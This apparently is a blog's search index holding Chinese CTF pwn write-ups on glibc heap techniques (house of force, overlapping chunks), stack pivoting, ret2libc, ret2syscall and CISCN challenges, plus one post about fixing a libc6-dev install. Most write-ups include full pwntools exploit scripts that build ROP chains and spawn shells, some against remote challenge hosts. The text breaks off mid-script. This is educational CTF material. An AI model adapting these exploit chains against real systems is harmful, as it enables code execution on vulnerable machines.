<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>200~house_of_force</title>
      <link href="/2024/11/03/house-of-force/"/>
      <url>/2024/11/03/house-of-force/</url>
      
        <content type="html"><![CDATA[<p>利用条件：能控制topchunk_size，能够自由控制申请的堆块大小。需要知道top_chunk地址与目的地址的偏移量，如果还不对齐，即结果不是0x0结尾，需要多减8，然后减去SIZE_SZ（8）</p><p>结果：能将topcunk的地址控制到我们想要的地址，再申请内存就可以控制这个地址的值。</p><h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>对topchunk_size的检查，(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)</p><pre><code class="lang-c++">// 获取当前的top chunk，并计算其对应的大小victim = av-&gt;top;size   = chunksize(victim);// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123;    remainder_size = size - nb;    remainder      = chunk_at_offset(victim, nb);    av-&gt;top        = remainder;    #设置top_chunk的头，附近值会有所变化    set_head(victim, nb | PREV_INUSE |            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head(remainder, remainder_size | PREV_INUSE);    check_malloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;&#125;</code></pre><p>所以把size改为-1，在补码中为很大的数，能够满足条件</p><h5 id="新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移"><a href="#新的remainder即top-chunk的地址-remainder-chunk-at-offset-victim-nb-，需要算出topchunk的地址和目标地址的偏移" class="headerlink" title="新的remainder即top_chunk的地址  **remainder = chunk_at_offset(victim, nb);**，需要算出topchunk的地址和目标地址的偏移"></a>新的remainder即top_chunk的地址  <code>**remainder = chunk_at_offset(victim, nb);**</code>，需要算出topchunk的地址和目标地址的偏移</h5><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>对申请的size的检查</p><pre><code class="lang-c++">/*   Check if a request is so large that it would wrap around zero when   padded and aligned. To simplify some other code, the bound is made   low enough so that adding MINSIZE will also not wrap around zero. */#这里的req即是nb.对req的大小的检查，((unsigned long) (req)要小于 (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))#define REQUEST_OUT_OF_RANGE(req)                                              \    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))/* pad request bytes into a usable size -- internal version *///MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1# 对nb加 SIZE_SZ加 MALLOC_ALIGN_MASK,最后和MALLOC_ALIGN_MASK按位与对齐,这里的SIZE_SZ是8#define request2size(req)                                                      \    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \         ? MINSIZE                                                             \         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)/*  Same, except also perform argument check */# req不能大于 -2 * MINSIZE，否则会报错#define checked_request2size(req, sz)                                          \    if (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \        __set_errno(ENOMEM);                                                   \        return 0;                                                              \    &#125;                                                                          \    (sz) = request2size(req);</code></pre><h5 id="首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。"><a href="#首先-unsigned-long-req-lt-unsigned-long-INTERNAL-SIZE-T-2-MINSIZE-，即无符号的nb要小于无符号的-2-MINSIZE，即req不能大于-2MINSIZE-，一般都能满足条件。" class="headerlink" title="首先  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2  MINSIZE))，即无符号的nb要小于无符号的  **-2  MINSIZE，即req不能大于-2MINSIZE*，一般都能满足条件。"></a>首先  ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 <em> MINSIZE))，即无符号的nb要小于无符号的  **-2 </em> MINSIZE<strong>，即req不能大于</strong>-2<em>MINSIZE*</em>，一般都能满足条件。</h5><h5 id="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"><a href="#其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8" class="headerlink" title="其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8"></a>其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8</h5><h5 id="req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了"><a href="#req-SIZE-SZ-MALLOC-ALIGN-MASK-amp-MALLOC-ALIGN-MASK-，这里的结果是最后申请的大小。由于-req-SIZE-SZ，SIZE-SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC-ALIGN-MASK，但是最后会被对齐掉，就不用多减掉MALLOC-ALIGN-MASK了" class="headerlink" title="((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了"></a>((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了</h5><p><code>MALLOC_ALIGN</code> 通常指的是内存块对齐的要求。如果req不对齐，不是0x0结尾的，需要多减掉8</p><h2 id="bcloud-bctf-2016"><a href="#bcloud-bctf-2016" class="headerlink" title="bcloud_bctf_2016"></a>bcloud_bctf_2016</h2><p>只开了栈上的保护</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104192949440.png" alt="image-20241104192949440"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193057354.png" alt="image-20241104193057354"></p><p>这里会把堆的地址给到v2的指针，后续会打印出来</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241104193219359.png" alt="image-20241104193219359"></p><p>🐕Ⅷ题目，调试的时候完全不是题目逻辑，算了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/10/29/pwn2%20short/"/>
      <url>/2024/10/29/pwn2%20short/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn2-short"><a href="#pwn2-short" class="headerlink" title="pwn2 short"></a>pwn2 short</h1><p>很简单的32位栈迁移，还留了个后门</p><p>这里获得栈地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241029170723988.png" alt="image-20241029170723988"></p><p>把bin/sh的地址放返回地址后面就ok</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)#p=process(&quot;./short&quot;)context.log_level=&quot;debug&quot;p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)p.recvuntil(&#39;0x&#39;)stack=int(p.recv(8),16)print(hex(stack))pop_edi=0x0804884apop_ebx=0x08048411gift=0x080485E6leave=0x08048674binsh=0x0804A038 payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave)#gdb.attach(p)sleep(1)p.sendlineafter(&quot;msg:&quot;,payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>overlapping_chunks</title>
      <link href="/2024/10/21/overlapping_chunks/"/>
      <url>/2024/10/21/overlapping_chunks/</url>
      
        <content type="html"><![CDATA[<p>大多都是堆溢出的情况下，chunk释放前或释放后改变size的值，再申请的时候造成两个堆块有重合的地方，有时候需要改变对应下一个堆的pre_size绕过检查，虽说在libc2.29以后才出现，但有时候2.23的版本还是会因此而报错。所以尽可能的在下一个chunk的pre_size位改成我们的size.</p><pre><code class="lang-c++">/* consolidate backward */    if (!prev_inuse(p)) &#123;      prevsize = prev_size (p);      size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */      if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);      unlink_chunk (av, p);    &#125;</code></pre><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p>该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护.</p><p>程序的最后有个格式化字符串漏洞，只能用一次，用于泄露libc和在fini的地方写上main函数地址</p><p>这里输入s是能写上栈的地方，这里输入fini的地址</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021202201568.png" alt="image-20241021202201568"></p><p>算出偏移是13</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021210331631.png" alt="image-20241021210331631"></p><p>这里只强调构造的fake_chunk</p><pre><code class="lang-py">payload=b&#39;%2828c%13$hnkk%31$p&#39;payload=payload.ljust(0x88,b&#39;b&#39;)payload+=p64(0x151)payload=payload.ljust(0x1d0,b&#39;\x41&#39;)+p64(0x150)+p64(0x41)+p64(0)*6+p64(0x40)+p64(0x31)</code></pre><p>申请堆的过程中有堆溢出可以更改下一个 堆的size，改成下面特殊的堆的size，根据题目给大小改。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220811817.png" alt="image-20241021220811817"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241021220706913.png" alt="image-20241021220706913"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>heapcreator</title>
      <link href="/2024/10/17/heapcreator/"/>
      <url>/2024/10/17/heapcreator/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>stdout</title>
      <link href="/2024/09/21/stdout/"/>
      <url>/2024/09/21/stdout/</url>
      
        <content type="html"><![CDATA[<p>这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显</p><p>刷新缓冲区有几种办法</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190505843.png" alt="image-20240922190505843"></p><p>能够溢出8字节</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190659808.png" alt="image-20240922190659808"></p><p>一个没什么用的函数</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922190726730.png" alt="image-20240922190726730"></p><p>那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202629304.png" alt="image-20240922202629304"></p><p>ret的操作是pop rip，rsp=rsp+8, 指向0x0x7fff153a5588.  endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相同的输入也只是让rbp+8,即每次</p><pre><code class="lang-py">for i in range(20):    payload=b&#39;c&#39;*0x28+p64(vul)    p.send(payload)    print(i)</code></pre><p>也只是让rbp+8移动</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922202708003.png" alt="image-20240922202708003"></p><p>第二次的rbp</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922203434985.png" alt="image-20240922203434985"></p><p>只是调用vuln的话时不会回显的。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922210006385.png" alt="image-20240922210006385"></p><p>其实不是理想当然的填充，得调用extend函数填充缓冲区。那么就只能不断调用extend函数把缓冲区填满。</p><p>调用extend时第二十次时的栈</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240922205219910.png" alt="image-20240922205219910"></p><p>exp</p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./pwn&quot;)context.log_level=&quot;debug&quot;elf=ELF(&#39;./pwn&#39;)libc=ELF(&#39;./libc-2.31.so&#39;)extend=0x401287vul=0x40125Dpop_rdi=0x4013d3puts_got=elf.got[&#39;puts&#39;]puts=elf.plt[&#39;puts&#39;]payload=b&#39;a&#39;*0x58+p64(vul)p.send(payload)payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul)p.send(payload)for i in range(21):    payload=b&#39;c&#39;*0x28+p64(extend)+p64(vul)    p.send(payload)p.recvuntil(&#39;stdout???&#39;)p.recvline()puts_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))base=puts_addr-0x10dfc0 #libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+next(libc.search(b&#39;bin/sh&#39;))gdb.attach(p)pause()payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(system)p.send(payload)print(hex(libc.sym[&#39;puts&#39;]))print(&#39;put&#39;+hex(puts_addr))p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>解决libc6软件包和libc6-dev不匹配的问题</title>
      <link href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>之前在学vm内核调试的时候，不小心把libc6-dev之类的包给删掉了，导致后面gcc编译不了，重新下载libc6-dev时，会弹出这样的报错，这种报错之前很常见。</p><pre><code class="lang-python">下列软件包有未满足的依赖关系： libc6-dev : 依赖: libc6 (= 2.27-3ubuntu1.6) 但是 2.35-0ubuntu3 正要被安装             依赖: libc-dev-bin (= 2.27-3ubuntu1.6)E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。</code></pre><p>最本质的原因就是已安装的libc6版本是2.35-0ubuntu3，但是要安装的libc6-dev所要的依赖是libc6和libc-dev-bin的版本都是2.27,当初想过把libc6降级的，因为libc6是软件包，有很多依赖关系，结果系统奔溃了，还刚好没提前拍快照，只有很久之前的。</p><p>libc6就是一个软件包名称，包含c标准库的所有功能，包含有很多库文件，如libc.so.6，是底层代码如prinf函数的实现。通常存放在/lib目录下，系统核心库的存放目录。</p><p>libc6-dev含有很多c标准库，如stdio.h,math.h.包含很多头文件。解压放到/usr/include/。</p><p>/usr/lib 目录是用户级库的存放目录，这些库文件是用户安装的软件包所需的，例如图形库、数据库库、开发库等。这些库文件通常是用户安装的软件包所需的，而不是系统核心组件所需的。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918204615913.png" alt="image-20240918204615913"></p><p>最正确的办法就是下载对应版本的libc6-dev.deb解压，要和已安装的libc6版本匹配，当时是直接找了网站<a href="http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/">glibc库</a> 下载libc6-dev.deb，但是找不到2.35版本的，后面终于在package.ubuntu.com找到,点这两个下载</p><pre><code class="lang-py">https://packages.ubuntu.com/jammy/libc6-dev</code></pre><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210634377.png" alt="image-20240918210634377"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210702629.png" alt="image-20240918210702629"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918210853312.png" alt="image-20240918210853312"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211010603.png" alt="image-20240918211010603"></p><p>解压到/tmp/libc6-dev</p><pre><code class="lang-py">mkdir /tmp/libc6-devdpkg-deb -x libc6-dev_2.35-0ubuntu3.8_amd64.deb /tmp/libc6-devsudo rsync -av /tmp/libc6-dev/usr/include/ /usr/include/         #移动头文件sudo rsync -av /tmp/libc6-dev/usr/share/ /usr/share/             #移动共享数据文件sudo rsync -av /tmp/libc6-dev/usr/lib/ /usr/lib/                 #移动用户级库文件，这里有一个小点。</code></pre><p>同理，libc-dev-bin也解压</p><pre><code class="lang-py">mkdir /tmp/libc-dev-bindpkg-deb -x libc-dev-bin_2.35-0ubuntu3.8_amd64.deb /tmp/libc-dev-binsudo rsync -av /tmp/libc-dev-bin/usr/ /usr/                      #主要是一些工具脚本</code></pre><p>后面把tmp目录下的这两个临时文件删了就好。</p><p>后面我试着gcc编译的时候，还是遇见了个老错误</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211756419.png" alt="image-20240918211756419"></p><pre><code class="lang-py">gcc 1.c -o 1/usr/bin/ld: 找不到 Scrt1.o: 没有那个文件或目录/usr/bin/ld: 找不到 crti.o: 没有那个文件或目录collect2: error: ld returned 1 exit status</code></pre><p>通过查找发现，它在/tmp/libc6-dev/usr/lib/x86_64-linux-gnu 这个目录里，这个正是库文件的位置，把这些库文件移动到/usr/lib/x86_64-linux-gnu/目录就好</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918211910349.png" alt="image-20240918211910349"></p><p>最后，编译成功</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240918212931846.png" alt="image-20240918212931846"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc</title>
      <link href="/2024/09/13/glibc/"/>
      <url>/2024/09/13/glibc/</url>
      
        <content type="html"><![CDATA[<h3 id="手动下载glibc版本"><a href="#手动下载glibc版本" class="headerlink" title="手动下载glibc版本"></a>手动下载glibc版本</h3><p> 有时候做题会遇到glibc-all-in-one里没有的glibc,需要自己下</p><p>可以到网站手动下载对应的./deb文件</p><pre><code class="lang-py">http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/</code></pre><p>在glibc-all-in-one目录下，若glibc版本名为x,用指令解压</p><pre><code class="lang-py">./extract ./x.deb ./libs/x</code></pre><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913170944068.png" alt="image-20240913170944068"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gostack</title>
      <link href="/2024/09/12/gostack/"/>
      <url>/2024/09/12/gostack/</url>
      
        <content type="html"><![CDATA[<p>i 一个用go语言写的程序。</p><p> alt+f7用go_parser修复一下</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193439984.png" alt="image-20240912193439984"></p><p>主要的函数，只有一个输入点，因为是go语言写的，其反汇编也是很难看懂</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912193707048.png" alt="image-20240912193707048"></p><p>主要看汇编,它后面会将输入的字符串复制到栈上</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194553878.png" alt="image-20240912194553878"></p><p>在scanner输入这里会检查这个位置的值是否为0</p><p>为了方便全都用0填充</p><p>脚本的具体调试是报错的，看不了，也只能分析个大概。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195104594.png" alt="image-20240913195104594"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913195003832.png" alt="image-20240913195003832"></p><p>直接gdb</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194856414.png" alt="image-20240912194856414"></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912194938053.png" alt="image-20240912194938053"></p><p>算出距离rbp是0x1c8的距离。</p><p>这种题一般是用ret2syscall。而往年的国赛题也是ret2syscall居多。</p><p>找到的gadget</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240912195323699.png" alt="image-20240912195323699"></p><p>syscall;ret是很难找到的。通过gadget找不到。</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20240913194222552.png" alt="image-20240913194222552"></p><p>先sys_read在bss段输入bin/sh,再sys_execve.</p><pre><code class="lang-py">#bss readpayload=b&#39;\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret)</code></pre><pre><code class="lang-py">#execvepayload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)</code></pre><h5 id="同时也顺带复习一下，sys-read的各个寄存器的值，rax-0-rdi-0-rsi-bss-rdx-size"><a href="#同时也顺带复习一下，sys-read的各个寄存器的值，rax-0-rdi-0-rsi-bss-rdx-size" class="headerlink" title="同时也顺带复习一下，sys_read的各个寄存器的值，rax=0,rdi=0,rsi=bss,rdx=size."></a>同时也顺带复习一下，sys_read的各个寄存器的值，rax=0,rdi=0,rsi=bss,rdx=size.</h5><h5 id="sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0"><a href="#sys-execve-rax-0x3b-rdi-bin-sh-addr-rsi-0-rdx-0" class="headerlink" title="sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0."></a>sys_execve,rax=0x3b,rdi=bin/sh_addr,rsi=0,rdx=0.</h5><h5 id="前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。"><a href="#前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。" class="headerlink" title="前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。"></a>前面按照脚本一样写一直跑不通，后面突然就跑通了，也是有点离谱。</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;pwn.challenge.ctf.show&quot;,28159)#p=process(&quot;./gostack&quot;)context.log_level=&quot;debug&quot;context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)#payload=b&#39;a&#39;*0x1d0+p64(0x4A0af6)pop_rdi_r14=0x4a18a5pop_rax=0x40f984bss=0x5655C2pop_rsi=0x42138apop_rdx=0x4944ecsyscall_ret=0x4616C9#gdb.attach(p)#pause()#bss readpayload=b&#39;\x00&#39;*0x1d0+p64(pop_rdi_r14)+p64(0)*6payload+=p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(pop_rax)+p64(0)+p64(syscall_ret)#excevepayload+=p64(pop_rdi_r14)+p64(bss)+p64(0)*5+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(pop_rax)+p64(0x3b)+p64(syscall_ret)#p.recv()p.sendlineafter(&#39;magic message :&#39;,payload)p.sendline(b&#39;/bin/sh\x00&#39;)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pstack</title>
      <link href="/2024/09/08/pstack/"/>
      <url>/2024/09/08/pstack/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>武功论剑</title>
      <link href="/2024/07/27/%E6%AD%A6%E5%8A%9F%E8%AE%BA%E5%89%91/"/>
      <url>/2024/07/27/%E6%AD%A6%E5%8A%9F%E8%AE%BA%E5%89%91/</url>
      
        <content type="html"><![CDATA[<p>一道很简单的apk题，反汇编出来，将两个数组的值一一异或就得到flag</p><p><img src="https://s2.loli.net/2024/07/27/dlFW9we6XxpRzNV.png" alt="image-20240727135021283"></p><p>这道简单的栈溢出题，开了canary保护</p><p>这里输入0x49个字节可以将canary和rbp打印出来</p><p><img src="https://s2.loli.net/2024/07/27/37YWbzvPcIiJ1H2.png" alt="image-20240727141257896"></p><p>主函数有个栈溢出漏洞，这里ret2libc泄露puts的got表地址，再返回重新输入一次</p><p><img src="https://s2.loli.net/2024/07/27/LGPVpf3ImUwqYdZ.png" alt="image-20240727141435162"></p><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;59.62.61.30&quot;,46489)p=process(&quot;./pwn&quot;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)pop_rdi=0x400853puts_got=0x601018call_puts=0x4007afpayload=b&#39;a&#39;*0x48+b&#39;b&#39;puts_plt=0x400580#pause()p.send(payload)p.recvuntil(&#39;b&#39;)canary=u64(p.recv(7).rjust(8,b&#39;\x00&#39;))rbp_addr=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))print(hex(canary))print(&#39;rbp&#39;+hex(rbp_addr))payload=b&#39;b&#39;*0x48+p64(canary)+p64(rbp_addr-0x50)payload+=p64(pop_rdi)+p64(puts_got)+p64(call_puts)gdb.attach(p)sleep(1)pause()p.sendlineafter(&#39;overflow!&#39;,payload)p.recvline()puts=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))base=puts-libc.sym[&#39;puts&#39;]system=base+libc.sym[&#39;system&#39;]binsh=base+next(libc.search(b&#39;bin/sh&#39;))print(&#39;puts&#39;+hex(puts))one=[0x4f3d5,0x4f432,0x10a41c]one_gadget=base+one[0]#p.recvline()payload=b&#39;a&#39;*0x48+p64(canary)+b&#39;a&#39;*8+p64(one_gadget)#+p64(pop_rdi)+p64(binsh)+p64(system)p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_pwn</title>
      <link href="/2024/05/19/ciscn-pwn/"/>
      <url>/2024/05/19/ciscn-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="第一天-gostack"><a href="#第一天-gostack" class="headerlink" title="第一天_gostack"></a>第一天_gostack</h2><h5 id="64位的静态编译题"><a href="#64位的静态编译题" class="headerlink" title="64位的静态编译题"></a>64位的静态编译题</h5><p><img src="https://s2.loli.net/2024/05/19/xeACKin2JEw7B8X.png" alt="image-20240519162316093"></p><p><img src="https://s2.loli.net/2024/05/19/5HwmgvtCEARJojT.png" alt="image-20240519162532844"></p><h5 id="很明显的syscall和很多可以利用的gadget"><a href="#很明显的syscall和很多可以利用的gadget" class="headerlink" title="很明显的syscall和很多可以利用的gadget"></a>很明显的syscall和很多可以利用的gadget</h5><p><img src="https://s2.loli.net/2024/05/19/lAQMKgWLYoJOx2n.png" alt="image-20240519162808628"></p><p><img src="https://s2.loli.net/2024/05/19/WIfjVbrg7SMcAPh.png" alt="image-20240519162853532"></p><h5 id="利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag"><a href="#利用syscall向bss段写入-bin-sh，再syscall执行execve-‘bin-sh’-0-0-拿到flag" class="headerlink" title="利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag"></a>利用syscall向bss段写入 bin/sh，再syscall执行execve(‘bin/sh’,0,0),拿到flag</h5><p><img src="https://s2.loli.net/2024/05/19/PIrL94hM2jltmno.png" alt="image-20240519163321686"></p><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;8.147.134.47&quot;,16589)#p=process(&quot;./gostack&quot;)elf=ELF(&#39;./gostack&#39;)context.log_level=&quot;debug&quot;# Gadgets and syscall addressessyscall_address = 0x404043rax_ret_address = 0x40f984rdi_6_ret_address = 0x4a18a5rsi_ret_address = 0x42138ardx_ret_address = 0x4944ec# Create the payloadpayload = b&#39;a&#39; * 0x100payload += p64(elf.bss()) + p64(0x10) + p64(0) * 0x18payload += p64(rdi_6_ret_address) + p64(0) * 6payload += p64(rsi_ret_address) + p64(elf.bss() + 0x200)payload += p64(rdx_ret_address) + p64(0x100)payload += p64(rax_ret_address) + p64(0)payload += p64(syscall_address)payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5payload += p64(rdi_6_ret_address) + p64(elf.bss() + 0x200) + p64(0) * 5payload += p64(rsi_ret_address) + p64(0)payload += p64(rdx_ret_address) + p64(0)payload += p64(rax_ret_address) + p64(0x3b)payload += p64(syscall_address)# Send the payloadp.sendlineafter(&#39;message :\n&#39;, payload)input()p.sendline(&#39;/bin/sh\x00&#39;)p.interactive()</code></pre><h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><p><img src="https://s2.loli.net/2024/05/19/tjciLKWbQEsTOF2.png" alt="image-20240519164039631"></p><h5 id="edit函数存在堆溢出"><a href="#edit函数存在堆溢出" class="headerlink" title="edit函数存在堆溢出"></a>edit函数存在堆溢出</h5><p><img src="https://s2.loli.net/2024/05/19/WyVCcLqEt6MK45J.png" alt="image-20240519164143452"></p><h5 id="开启了沙箱保护-这是一道堆的orw。"><a href="#开启了沙箱保护-这是一道堆的orw。" class="headerlink" title="开启了沙箱保护,这是一道堆的orw。"></a>开启了沙箱保护,这是一道堆的orw。</h5><p><img src="https://s2.loli.net/2024/05/19/EVw45MF9RsYUeTp.png" alt="image-20240519164437835"></p><h5 id="泄露出堆的基地址"><a href="#泄露出堆的基地址" class="headerlink" title="泄露出堆的基地址"></a>泄露出堆的基地址</h5><pre><code class="lang-py">add_chunk(0x28)add_chunk(0x28)# Edit and leak heap addressedit_chunk(0, 0x50, b&#39;a&#39; * 0x50)show_chunk(0)io.recvuntil(b&#39;a&#39; * 0x50)gdb.attach(io)pause()heap_leak = u64(io.recvuntil(b&#39;Welcome to CISCN 2024!&#39;, drop=True).ljust(8, b&#39;\x00&#39;))heap_base = 